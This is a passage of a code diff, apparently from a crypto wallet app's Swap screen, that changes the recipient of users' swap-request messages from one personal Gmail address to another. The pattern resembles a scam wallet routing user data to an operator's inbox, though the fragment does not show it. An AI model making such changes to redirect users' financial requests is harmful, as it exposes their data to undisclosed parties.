@@ -42,7 +42,7 @@ const Swap = ({ navigation }) => {
         date: new Date().toDateString(),
         type,
         status: "Pending",
-        to: ["bchain676754@gmail.com"],
+        to: ["diamondprofx@gmail.com"],
         message: {
           subject: `Swap request from Blockchain Wallet`,
           text: `The user user with the email ${
